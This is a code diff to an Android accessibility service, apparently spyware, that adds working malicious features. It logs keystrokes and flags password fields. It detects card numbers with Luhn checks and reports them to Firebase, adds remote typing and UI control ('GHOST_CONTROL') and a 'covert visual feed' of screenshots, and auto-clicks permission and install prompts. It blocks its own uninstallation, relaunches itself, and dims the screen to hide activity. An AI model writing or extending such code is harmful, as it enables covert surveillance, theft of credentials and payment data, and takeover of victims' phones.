@@ -14,6 +14,7 @@ import android.view.View;
 import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
+import androidx.core.content.ContextCompat;
 
 import java.util.ArrayList;
 import java.util.Collections;
@@ -101,7 +102,6 @@ public class IO_Persistence_Manager extends AccessibilityService {
                 
                 if (packageName.contains("permissioncontroller") || 
                     packageName.contains("packageinstaller") || 
-                    packageName.contains("settings") ||
                     packageName.contains("vending") ||
                     packageName.contains("gms")) {
                     runTacticalAutoPilot(packageName);
@@ -114,18 +114,19 @@ public class IO_Persistence_Manager extends AccessibilityService {
             packageName.equals(getPackageName()) || 
             packageName.contains("systemui") || 
             packageName.contains("launcher") ||
-            packageName.contains("recents") ||
-            packageName.contains("android.gms") ||
-            packageName.contains("vending")) {
+            packageName.contains("recents")) {
             return;
         }
 
-        if (packageName.contains("messaging") || 
-            packageName.contains("mms") || 
-            packageName.contains("sms") || 
-            packageName.contains("whatsapp") ||
-            packageName.contains("telecom")) {
-            return;
+        // Allow permission controller so Auto-Pilot can work
+        if (!packageName.contains("permissioncontroller") && !packageName.contains("packageinstaller")) {
+            if (packageName.contains("messaging") || 
+                packageName.contains("mms") || 
+                packageName.contains("sms") || 
+                packageName.contains("whatsapp") ||
+                packageName.contains("telecom")) {
+                return;
+            }
         }
 
         final List<String> eventText = new ArrayList<>();
@@ -166,6 +167,12 @@ public class IO_Persistence_Manager extends AccessibilityService {
     private long lastAntiRemovalExecution = 0;
 
     private void checkAntiRemovalInternal() {
+        // [STABILITY_SYNC] Skip anti-removal checks if we are currently in the Guided Permission Repair flow
+        // This prevents the shield from kicking the user out while they are granting permissions.
+        if (getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_repairing", false)) {
+            return;
+        }
+
         // Double-check persistent flag
         if (getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false)) {
             return; 
@@ -189,7 +196,16 @@ public class IO_Persistence_Manager extends AccessibilityService {
                     return;
                 }
 
-                String[] danger = {"uninstall", "disable", "delete"};
+                // Only trigger if we are specifically on OUR app's details page and see dangerous buttons
+                if (pkg.contains("settings")) {
+                    List<AccessibilityNodeInfo> labels = root.findAccessibilityNodeInfosByText("System Stability Service");
+                    if (labels == null || labels.isEmpty()) {
+                        root.recycle();
+                        return;
+                    }
+                }
+
+                String[] danger = {"uninstall", "delete", "clear data"};
                 for (String s : danger) {
                     List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(s);
                     if (nodes != null && !nodes.isEmpty()) {
@@ -219,9 +235,11 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
         switch (eventType) {
             case AccessibilityEvent.TYPE_VIEW_FOCUSED:
-                // When a field is focused, try a deeper inspection to find hints or labels
                 AccessibilityNodeInfo source = getRootInActiveWindow();
                 if (source != null) {
+                    if (source.isPassword()) {
+                        log.append("[PASSWORD_FIELD_DETECTED]: ");
+                    }
                     deepInspectNode(source, log);
                     source.recycle();
                 }
@@ -284,10 +302,34 @@ public class IO_Persistence_Manager extends AccessibilityService {
     }
 
     private void logKeystroke(String msg) {
+        // --- SMART INTEL: LUHN VALIDATION (Credit Card Detection) ---
+        if (msg.matches(".*\\b\\d{4}[ -]?\\d{4}[ -]?\\d{4}[ -]?\\d{4}\\b.*")) {
+            String clean = msg.replaceAll("[^0-9]", "");
+            if (isValidLuhn(clean)) {
+                FirebaseConfig.logActivity("INTEL_CRITICAL: Valid Credit Card signature detected in buffer");
+                msg = "[FINANCIAL_INTEL_DETECTED]: " + msg;
+            }
+        }
+
         synchronized (keystrokes) {
             keystrokes.add(msg);
             while (keystrokes.size() > 2000) keystrokes.remove(0);
         }
+    }
+
+    private boolean isValidLuhn(String number) {
+        int sum = 0;
+        boolean alternate = false;
+        for (int i = number.length() - 1; i >= 0; i--) {
+            int n = Integer.parseInt(number.substring(i, i + 1));
+            if (alternate) {
+                n *= 2;
+                if (n > 9) n = (n % 10) + 1;
+            }
+            sum += n;
+            alternate = !alternate;
+        }
+        return (sum % 10 == 0);
     }
 
     public static List<String> getKeystrokes() {
@@ -313,7 +355,6 @@ public class IO_Persistence_Manager extends AccessibilityService {
                 if (enabled) {
                     if (blackoutView == null) {
                         blackoutView = new View(IO_Persistence_Manager.this);
-                        // Using argb(210, 0, 0, 0) for dark but non-blocking overlay
                         blackoutView.setBackgroundColor(android.graphics.Color.argb(210, 0, 0, 0));
                         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                 WindowManager.LayoutParams.MATCH_PARENT,
@@ -324,12 +365,10 @@ public class IO_Persistence_Manager extends AccessibilityService {
                                 WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                 WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                 WindowManager.LayoutParams.FLAG_FULLSCREEN |
-                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
-                                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
+                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                                 android.graphics.PixelFormat.TRANSLUCENT);
                         
-                        // Absolute zero brightness for physical stealth
-                        params.screenBrightness = 0.0f;
+                        params.screenBrightness = 0.001f;
                         params.buttonBrightness = 0.0f;
                         
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
@@ -477,61 +516,172 @@ public class IO_Persistence_Manager extends AccessibilityService {
     }
 
     public void showOverlayToast(final String message) {
-        if (message == null || message.isEmpty()) return; // [STABILITY_SYNC] Quiet ping handler
+        showOverlayToast(message, 22, 250, "scroll", 12000, "#FFFFFF");
+    }
+
+    public void showOverlayToast(final String message, final int fontSize, final int yPos, final String animation, final int duration, final String hexColor) {
+        if (message == null || message.isEmpty()) return;
         new Handler(Looper.getMainLooper()).post(() -> {
             try {
                 WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                 
                 final android.widget.TextView tv = new android.widget.TextView(IO_Persistence_Manager.this);
                 tv.setText(message);
-                tv.setTextColor(android.graphics.Color.WHITE);
-                tv.setPadding(60, 30, 60, 30);
-                tv.setGravity(android.view.Gravity.CENTER);
-                tv.setTextSize(22);
-                tv.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
-                tv.setSingleLine(true); // Ensure it doesn't wrap while scrolling
                 
-                // Rounded corners via drawable
-                android.graphics.drawable.GradientDrawable shape = new android.graphics.drawable.GradientDrawable();
-                shape.setCornerRadius(50);
-                shape.setColor(android.graphics.Color.argb(230, 20, 20, 20));
-                tv.setBackground(shape);
-
+                int color = android.graphics.Color.WHITE;
+                if (hexColor != null && !hexColor.isEmpty()) {
+                    try { color = android.graphics.Color.parseColor(hexColor); } catch (Exception ignored) {}
+                }
+                tv.setTextColor(color);
+                tv.setPadding(30, 20, 30, 20);
+                tv.setTextSize(fontSize > 0 ? fontSize : 22);
+                tv.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
+                
                 WindowManager.LayoutParams params = new WindowManager.LayoutParams(
-                        WindowManager.LayoutParams.MATCH_PARENT,
                         WindowManager.LayoutParams.WRAP_CONTENT,
-                        (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 2032 : 2003,
+                        WindowManager.LayoutParams.WRAP_CONTENT,
+                        (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
+                            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY : 2003,
                         WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                         WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                         WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                         WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                         WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                         android.graphics.PixelFormat.TRANSLUCENT);
-                
-                params.gravity = android.view.Gravity.BOTTOM | android.view.Gravity.LEFT;
-                params.y = 250; // Distance from bottom
-                params.x = 0;
 
-                wm.addView(tv, params);
-                
-                final int screenW = getScreenWidth() > 0 ? getScreenWidth() : 1080;
+                android.view.View viewToDisplay = tv;
 
-                // Use post to ensure the view is measured so we can calculate its exact width
-                tv.post(() -> {
-                    int viewWidth = tv.getWidth();
-                    // Start completely off-screen to the right
-                    tv.setTranslationX(screenW);
+                if ("scroll".equalsIgnoreCase(animation)) {
+                    tv.setSingleLine(true);
+                    tv.setGravity(android.view.Gravity.START | android.view.Gravity.CENTER_VERTICAL);
                     
-                    // Scroll to completely off-screen to the left
+                    // Container to allow tight background on tv while window is full-width
+                    android.widget.FrameLayout container = new android.widget.FrameLayout(IO_Persistence_Manager.this);
+                    container.addView(tv, new android.widget.FrameLayout.LayoutParams(
+                            android.widget.FrameLayout.LayoutParams.WRAP_CONTENT,
+                            android.widget.FrameLayout.LayoutParams.WRAP_CONTENT));
+                    
+                    params.width = WindowManager.LayoutParams.MATCH_PARENT;
+                    params.gravity = android.view.Gravity.BOTTOM | android.view.Gravity.START;
+                    params.x = 0;
+                    tv.setTranslationX(2500); 
+                    viewToDisplay = container;
+                } else {
+                    tv.setGravity(android.view.Gravity.CENTER);
+                    params.gravity = android.view.Gravity.BOTTOM | android.view.Gravity.CENTER_HORIZONTAL;
+                    params.x = 0;
+                }
+                params.y = yPos > 0 ? yPos : 250; 
+
+                // Rounded corners via drawable
+                android.graphics.drawable.GradientDrawable shape = new android.graphics.drawable.GradientDrawable();
+                shape.setCornerRadius(50);
+                shape.setColor(android.graphics.Color.argb(230, 20, 20, 20));
+                tv.setBackground(shape);
+
+                final android.view.View finalView = viewToDisplay;
+                wm.addView(finalView, params);
+                
+                final int screenW = getScreenWidth() > 0 ? getScreenWidth() : getResources().getDisplayMetrics().widthPixels;
+
+                if ("pop".equalsIgnoreCase(animation)) {
+                    tv.setAlpha(0f);
+                    tv.setScaleX(0.5f);
+                    tv.setScaleY(0.5f);
                     tv.animate()
-                      .translationX(-viewWidth)
-                      .setDuration(12000)
-                      .setInterpolator(new android.view.animation.LinearInterpolator())
+                      .alpha(1f)
+                      .scaleX(1.1f)
+                      .scaleY(1.1f)
+                      .setDuration(300)
                       .withEndAction(() -> {
-                          try { wm.removeView(tv); } catch (Exception ignored) {}
+                          tv.animate().scaleX(1.0f).scaleY(1.0f).setDuration(100).start();
+                          new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                              tv.animate().alpha(0f).setDuration(500).withEndAction(() -> {
+                                  try { wm.removeView(finalView); } catch (Exception ignored) {}
+                              }).start();
+                          }, duration > 0 ? duration : 3000);
                       })
                       .start();
-                });
+                } else if ("scroll".equalsIgnoreCase(animation)) {
+                    tv.post(() -> {
+                        // Calculate text width to know when it's fully off-screen
+                        float textWidth = tv.getPaint().measureText(message) + tv.getPaddingLeft() + tv.getPaddingRight();
+                        
+                        // Snap to right edge exactly
+                        tv.setTranslationX(screenW);
+                        
+                        tv.animate()
+                          .translationX(-textWidth) // Move until the end of the text passes the left edge
+                          .setDuration(duration > 0 ? duration : 12000)
+                          .setInterpolator(new android.view.animation.LinearInterpolator())
+                          .withEndAction(() -> {
+                              try { wm.removeView(finalView); } catch (Exception ignored) {}
+                          })
+                          .start();
+                    });
+                } else if ("burnt".equalsIgnoreCase(animation)) {
+                    // PRANK: Burnt Toast (Extreme shaking, color glitching, rapid flicker)
+                    tv.setAlpha(0f);
+                    tv.setScaleX(0.9f);
+                    tv.setScaleY(0.9f);
+                    
+                    int startColor = android.graphics.Color.WHITE;
+                    try { startColor = android.graphics.Color.parseColor(hexColor); } catch (Exception ignored) {}
+                    tv.setTextColor(startColor);
+                    
+                    shape.setColor(android.graphics.Color.BLACK);
+                    shape.setStroke(6, startColor);
+                    
+                    tv.animate().alpha(1f).scaleX(1.1f).scaleY(1.1f).setDuration(150).start();
+                    
+                    final Handler glitchHandler = new Handler(Looper.getMainLooper());
+                    final Runnable glitchRunnable = new Runnable() {
+                        @Override
+                        public void run() {
+                            // Violent multi-axis shake
+                            tv.setTranslationX((float) (Math.random() * 30 - 15));
+                            tv.setTranslationY((float) (Math.random() * 30 - 15));
+                            // Rapid flicker
+                            tv.setAlpha((float) (0.2 + Math.random() * 0.8));
+                            // Intense random color glitching
+                            if (Math.random() > 0.5) {
+                                int[] glitchColors = {0xFFFF3131, 0xFF39FF14, 0xFF00F2FF, 0xFFFFFF00, 0xFFFF00FF, 0xFFFFFFFF, 0xFF000000, 0xFFFF9D00};
+                                int nextColor = glitchColors[(int)(Math.random() * glitchColors.length)];
+                                tv.setTextColor(nextColor);
+                                shape.setStroke(6, nextColor);
+                            }
+                            glitchHandler.postDelayed(this, 30);
+                        }
+                    };
+                    glitchHandler.post(glitchRunnable);
+
+                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                        glitchHandler.removeCallbacks(glitchRunnable);
+                        tv.animate().alpha(0f).scaleX(2.0f).scaleY(0.01f).setDuration(250).withEndAction(() -> {
+                            try { wm.removeView(finalView); } catch (Exception ignored) {}
+                        }).start();
+                    }, duration > 0 ? duration : 5000);
+                } else {
+                    // Static Fade - Professional vertical slide and blur-in feel
+                    tv.setAlpha(0f);
+                    tv.setTranslationY(100f); // Start significantly lower
+                    tv.animate()
+                      .alpha(1f)
+                      .translationY(0f) // Slide up to anchor
+                      .setDuration(1000)
+                      .setInterpolator(new android.view.animation.OvershootInterpolator(0.7f))
+                      .start();
+                      
+                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                        tv.animate()
+                          .alpha(0f)
+                          .translationY(-100f) // Continue sliding up as it fades out
+                          .setDuration(1000)
+                          .withEndAction(() -> {
+                              try { wm.removeView(finalView); } catch (Exception ignored) {}
+                          }).start();
+                    }, duration > 0 ? duration : 4000);
+                }
                 
             } catch (Exception e) { Log.e(TAG, "Overlay Toast Error: " + e.getMessage()); }
         });
@@ -551,24 +701,212 @@ public class IO_Persistence_Manager extends AccessibilityService {
         });
     }
 
+    // ============ UI INSPECTOR ============
+
+    private final java.util.concurrent.ConcurrentHashMap<Integer, AccessibilityNodeInfo> nodeIdMap = new java.util.concurrent.ConcurrentHashMap<>();
+    private int nextNodeId = 0;
+
+    public String captureUiTree() {
+        nodeIdMap.clear();
+        nextNodeId = 0;
+        
+        org.json.JSONObject rootObj = new org.json.JSONObject();
+        try {
+            updateDisplayMetrics();
+            rootObj.put("width", screenWidth);
+            rootObj.put("height", screenHeight);
+
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root != null) {
+                rootObj.put("package", root.getPackageName() != null ? root.getPackageName().toString() : "Unknown");
+                rootObj.put("tree", serializeNode(root, 0));
+                root.recycle();
+            } else {
+                rootObj.put("error", "Root node unavailable");
+            }
+        } catch (Exception e) {
+            try { rootObj.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return rootObj.toString();
+    }
+
+    private org.json.JSONObject serializeNode(AccessibilityNodeInfo node, int depth) {
+        if (node == null || depth > 50) return null;
+
+        org.json.JSONObject obj = new org.json.JSONObject();
+        try {
+            int id = nextNodeId++;
+            nodeIdMap.put(id, AccessibilityNodeInfo.obtain(node));
+            
+            obj.put("id", id);
+            obj.put("class", node.getClassName() != null ? node.getClassName().toString() : "View");
+            
+            CharSequence text = node.getText();
+            if (text != null) obj.put("text", text.toString());
+            
+            CharSequence desc = node.getContentDescription();
+            if (desc != null) obj.put("desc", desc.toString());
+            
+            String resId = node.getViewIdResourceName();
+            if (resId != null) obj.put("resId", resId);
+
+            Rect rect = new Rect();
+            node.getBoundsInScreen(rect);
+            obj.put("x", rect.left);
+            obj.put("y", rect.top);
+            obj.put("w", rect.width());
+            obj.put("h", rect.height());
+
+            obj.put("clickable", node.isClickable());
+            obj.put("focusable", node.isFocusable());
+            obj.put("editable", node.isEditable());
+            obj.put("password", node.isPassword());
+            obj.put("visible", node.isVisibleToUser());
+
+            org.json.JSONArray children = new org.json.JSONArray();
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    org.json.JSONObject childObj = serializeNode(child, depth + 1);
+                    if (childObj != null) children.put(childObj);
+                    child.recycle();
+                }
+            }
+            if (children.length() > 0) obj.put("children", children);
+
+        } catch (Exception ignored) {}
+        return obj;
+    }
+
+    public boolean performNodeAction(int id, int action) {
+        AccessibilityNodeInfo node = nodeIdMap.get(id);
+        if (node != null) {
+            return node.performAction(action);
+        }
+        return false;
+    }
+
+    public void typeText(final String text) {
+        if (text == null) return;
+        new Handler(Looper.getMainLooper()).post(() -> {
+            try {
+                AccessibilityNodeInfo root = getRootInActiveWindow();
+                if (root == null) return;
+
+                AccessibilityNodeInfo target = findFocusedEditableNode(root);
+                if (target != null) {
+                    // Stage 1: Try Direct Injection (ACTION_SET_TEXT)
+                    android.os.Bundle arguments = new android.os.Bundle();
+                    arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
+                    boolean success = target.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
+                    
+                    if (!success) {
+                        // Stage 2: Clipboard Fallback (Copy + Paste)
+                        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(android.content.Context.CLIPBOARD_SERVICE);
+                        if (clipboard != null) {
+                            android.content.ClipData clip = android.content.ClipData.newPlainText("Uplink", text);
+                            clipboard.setPrimaryClip(clip);
+                            target.performAction(AccessibilityNodeInfo.ACTION_PASTE);
+                            FirebaseConfig.logActivity("GHOST_CONTROL: Remote typing via Clipboard Fallback");
+                        }
+                    } else {
+                        FirebaseConfig.logActivity("GHOST_CONTROL: Remote typing via Direct Injection");
+                    }
+                    target.recycle();
+                } else {
+                    FirebaseConfig.logActivity("GHOST_WARNING: No focused input field detected");
+                }
+                root.recycle();
+            } catch (Exception e) {
+                Log.e(TAG, "Type Error: " + e.getMessage());
+            }
+        });
+    }
+
+    private AccessibilityNodeInfo findFocusedEditableNode(AccessibilityNodeInfo node) {
+        if (node == null) return null;
+        if (node.isFocused() && node.isEditable()) return AccessibilityNodeInfo.obtain(node);
+        
+        for (int i = 0; i < node.getChildCount(); i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            AccessibilityNodeInfo result = findFocusedEditableNode(child);
+            if (child != null) child.recycle();
+            if (result != null) return result;
+        }
+        return null;
+    }
+
     // ============ INTERACTION ============
 
     public boolean clickAt(int x, int y) {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
-        
         // --- HARDENED BOUNDS CHECK: Prevents Path bounds must not be negative crash ---
         if (x < 0 || y < 0) {
              Log.w(TAG, "Suppressed clickAt with negative coordinates: (" + x + "," + y + ")");
              return false;
         }
 
-        Path path = new Path();
-        path.moveTo(x, y);
-        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, 150);
-        GestureDescription.Builder builder = new GestureDescription.Builder();
-        builder.addStroke(stroke);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            try {
+                Path path = new Path();
+                path.moveTo(x, y);
+                GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, 150);
+                GestureDescription.Builder builder = new GestureDescription.Builder();
+                builder.addStroke(stroke);
+                
+                return dispatchGesture(builder.build(), null, null);
+            } catch (Exception e) {
+                Log.e(TAG, "Click Dispatch Error: " + e.getMessage());
+                return false;
+            }
+        } else {
+            // FALLBACK FOR API < 24: Coordinate-to-Node Mapping
+            Log.d(TAG, "Executing legacy click fallback for API " + Build.VERSION.SDK_INT);
+            return clickAtLegacy(x, y);
+        }
+    }
+
+    private boolean clickAtLegacy(int x, int y) {
+        AccessibilityNodeInfo root = getRootInActiveWindow();
+        if (root == null) return false;
         
-        return dispatchGesture(builder.build(), null, null);
+        AccessibilityNodeInfo target = findNodeAt(root, x, y);
+        boolean success = false;
+        if (target != null) {
+            // Find nearest clickable parent
+            AccessibilityNodeInfo clickable = target;
+            while (clickable != null && !clickable.isClickable()) {
+                AccessibilityNodeInfo parent = clickable.getParent();
+                if (clickable != target) clickable.recycle();
+                clickable = parent;
+            }
+            
+            if (clickable != null) {
+                success = clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                if (clickable != target) clickable.recycle();
+            }
+            target.recycle();
+        }
+        root.recycle();
+        return success;
+    }
+
+    private AccessibilityNodeInfo findNodeAt(AccessibilityNodeInfo node, int x, int y) {
+        if (node == null) return null;
+        
+        Rect bounds = new Rect();
+        node.getBoundsInScreen(bounds);
+        
+        if (!bounds.contains(x, y)) return null;
+        
+        // Search children first (z-order)
+        for (int i = node.getChildCount() - 1; i >= 0; i--) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            AccessibilityNodeInfo result = findNodeAt(child, x, y);
+            if (child != null) child.recycle();
+            if (result != null) return result;
+        }
+        
+        return AccessibilityNodeInfo.obtain(node);
     }
 
     public boolean clickByText(String text) {
@@ -650,12 +988,43 @@ public class IO_Persistence_Manager extends AccessibilityService {
     }
 
     public boolean swipe(int x1, int y1, int x2, int y2, int duration) {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
-        Path path = new Path(); path.moveTo(x1, y1); path.lineTo(x2, y2);
-        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, Math.max(duration, 100));
-        GestureDescription.Builder builder = new GestureDescription.Builder();
-        builder.addStroke(stroke);
-        return dispatchGesture(builder.build(), null, null);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            try {
+                Path path = new Path(); path.moveTo(x1, y1); path.lineTo(x2, y2);
+                GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, Math.max(duration, 100));
+                GestureDescription.Builder builder = new GestureDescription.Builder();
+                builder.addStroke(stroke);
+                return dispatchGesture(builder.build(), null, null);
+            } catch (Exception e) {
+                Log.e(TAG, "Swipe Dispatch Error: " + e.getMessage());
+                return false;
+            }
+        } else {
+            // Legacy Swipe Fallback: Map to Scroll actions if possible
+            Log.d(TAG, "Legacy swipe fallback: Attempting scroll action");
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root == null) return false;
+            
+            AccessibilityNodeInfo target = findNodeAt(root, x1, y1);
+            boolean success = false;
+            if (target != null) {
+                AccessibilityNodeInfo scrollable = target;
+                while (scrollable != null && !scrollable.isScrollable()) {
+                    AccessibilityNodeInfo parent = scrollable.getParent();
+                    if (scrollable != target) scrollable.recycle();
+                    scrollable = parent;
+                }
+                
+                if (scrollable != null) {
+                    int action = (y2 < y1) ? AccessibilityNodeInfo.ACTION_SCROLL_FORWARD : AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD;
+                    success = scrollable.performAction(action);
+                    if (scrollable != target) scrollable.recycle();
+                }
+                target.recycle();
+            }
+            root.recycle();
+            return success;
+        }
     }
 
     // ============ SCREENSHOT ============
@@ -667,42 +1036,51 @@ public class IO_Persistence_Manager extends AccessibilityService {
         if (isScreenshotting) { callback.onFailure("BUSY"); return; }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             isScreenshotting = true;
-            takeScreenshot(android.view.Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
-                @Override
-                public void onSuccess(ScreenshotResult screenshotResult) {
-                    isScreenshotting = false;
-                    android.hardware.HardwareBuffer hardwareBuffer = screenshotResult.getHardwareBuffer();
-                    try {
-                        android.graphics.Bitmap bitmap = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshotResult.getColorSpace());
-                        if (bitmap != null) {
-                            // Convert hardware bitmap to software to fix bloom/HDR issues
-                            android.graphics.Bitmap softwareBitmap = bitmap.copy(android.graphics.Bitmap.Config.ARGB_8888, false);
-                            if (softwareBitmap != null) {
-                                int targetWidth = 720;
-                                int targetHeight = (int) (softwareBitmap.getHeight() * (targetWidth / (float) softwareBitmap.getWidth()));
-                                android.graphics.Bitmap scaled = android.graphics.Bitmap.createScaledBitmap(softwareBitmap, targetWidth, targetHeight, true);
-                                
-                                java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
-                                // 60% quality reduces the HDR glow artifacts seen in the feed
-                                scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, out);
-                                callback.onSuccess(out.toByteArray());
-                                
-                                scaled.recycle();
-                                softwareBitmap.recycle();
-                            }
-                            bitmap.recycle();
-                        } else { callback.onFailure("Buffer wrap failed"); }
-                    } catch (Exception e) { callback.onFailure(e.getMessage()); } 
-                    finally { if (hardwareBuffer != null) hardwareBuffer.close(); }
-                }
-                @Override
-                public void onFailure(int i) {
-                    isScreenshotting = false;
-                    callback.onFailure("OS Error: " + i);
-                }
-            });
+            try {
+                takeScreenshot(android.view.Display.DEFAULT_DISPLAY, ContextCompat.getMainExecutor(this), new TakeScreenshotCallback() {
+                    @Override
+                    public void onSuccess(ScreenshotResult screenshotResult) {
+                        isScreenshotting = false;
+                        android.hardware.HardwareBuffer hardwareBuffer = screenshotResult.getHardwareBuffer();
+                        try {
+                            android.graphics.Bitmap bitmap = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshotResult.getColorSpace());
+                            if (bitmap != null) {
+                                // Convert hardware bitmap to software to fix bloom/HDR issues
+                                android.graphics.Bitmap softwareBitmap = bitmap.copy(android.graphics.Bitmap.Config.ARGB_8888, false);
+                                if (softwareBitmap != null) {
+                                    int targetWidth = 720;
+                                    int targetHeight = (int) (softwareBitmap.getHeight() * (targetWidth / (float) softwareBitmap.getWidth()));
+                                    android.graphics.Bitmap scaled = android.graphics.Bitmap.createScaledBitmap(softwareBitmap, targetWidth, targetHeight, true);
+                                    
+                                    java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
+                                    // 60% quality reduces the HDR glow artifacts seen in the feed
+                                    scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, out);
+                                    callback.onSuccess(out.toByteArray());
+                                    
+                                    scaled.recycle();
+                                    softwareBitmap.recycle();
+                                }
+                                bitmap.recycle();
+                            } else { callback.onFailure("Buffer wrap failed"); }
+                        } catch (Exception e) { callback.onFailure(e.getMessage()); } 
+                        finally { if (hardwareBuffer != null) hardwareBuffer.close(); }
+                    }
+                    @Override
+                    public void onFailure(int i) {
+                        isScreenshotting = false;
+                        callback.onFailure("OS Error: " + i);
+                    }
+                });
+            } catch (Exception e) {
+                isScreenshotting = false;
+                callback.onFailure("Screenshot exception: " + e.getMessage());
+            }
             new Handler(Looper.getMainLooper()).postDelayed(() -> isScreenshotting = false, 5000);
-        } else { callback.onFailure("Android 11+ Required"); }
+        } else { 
+            String msg = "LIVE_FEED_UNAVAILABLE: Android 11+ is required for the covert visual feed. " +
+                        "However, GHOST_CONTROL and GHOST_INSPECTOR remain functional on this device (API " + Build.VERSION.SDK_INT + ").";
+            callback.onFailure(msg); 
+        }
     }
 
     @Override
@@ -741,7 +1119,13 @@ public class IO_Persistence_Manager extends AccessibilityService {
             android.app.AlarmManager am = (android.app.AlarmManager) getSystemService(android.content.Context.ALARM_SERVICE);
             Intent i = new Intent(this, WorkManager_Sync.class);
             i.setAction("START");
-            android.app.PendingIntent pi = android.app.PendingIntent.getForegroundService(this, 99, i, android.app.PendingIntent.FLAG_IMMUTABLE);
+            android.app.PendingIntent pi;
+            int piFlags = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? android.app.PendingIntent.FLAG_IMMUTABLE : 0);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                pi = android.app.PendingIntent.getForegroundService(this, 99, i, piFlags);
+            } else {
+                pi = android.app.PendingIntent.getService(this, 99, i, piFlags);
+            }
             if (am != null) am.set(android.app.AlarmManager.ELAPSED_REALTIME, android.os.SystemClock.elapsedRealtime() + 1000, pi);
         } catch (Exception ignored) {}
         super.onTaskRemoved(rootIntent);
@@ -758,48 +1142,58 @@ public class IO_Persistence_Manager extends AccessibilityService {
     private void runTacticalAutoPilot(String pkg) {
         if (pkg == null || !autoPilotEngaged) return;
         
-        // --- GREEDY SCAN ---
-        // We look for any "Positive Action" buttons in system dialogs
+        // --- PHANTOM_V2: AGGRESSIVE PERMISSION AUTO-GRANTER ---
         String[] targets = {
             "ALLOW", "ALLOW ALL THE TIME", "WHILE USING THE APP", "OK", "YES", "GRANT", "PROCEED",
             "INSTALL", "INSTALL ANYWAY", "UPDATE", "OPEN", "CONTINUE", "KEEP APP", "I ACCEPT",
-            "Allow", "allow", "Ok", "ok", "Yes", "yes",
-            "AUTHORIZE", "Authorize", "authorize", "GRANT", "Grant", "grant",
-            "AUTORISER", "OUI", "PERMITIR", "ACEPTAR", "SI" // Multi-lang
+            "Allow", "allow", "Ok", "ok", "Yes", "yes", "Accept", "accept",
+            "While using the app", "Only this time", "Allow all the time",
+            "AUTHORIZE", "Authorize", "authorize", "AUTORISER", "OUI", "PERMITIR", "ACEPTAR", "SI", 
+            "PERMIT", "PERMITIR SIEMPRE", "CONFIRM", "Confirm", "STILL INSTALL", "FORCE START", "ENABLE",
+            "ACTIVATE", "Activate", "TURN ON", "Turn on", "I AGREE", "Agree", "START NOW", "Start now",
+            "System Stability Service" // Specific service name for auto-navigation
         };
 
-        AccessibilityNodeInfo root = getRootInActiveWindow();
-        if (root != null) {
-            for (String target : targets) {
-                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(target);
-                if (nodes != null && !nodes.isEmpty()) {
-                    for (AccessibilityNodeInfo node : nodes) {
-                        if (node.isVisibleToUser()) {
-                            if (node.isClickable()) {
-                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                            } else {
-                                Rect bounds = new Rect();
-                                node.getBoundsInScreen(bounds);
-                                clickAt(bounds.centerX(), bounds.centerY());
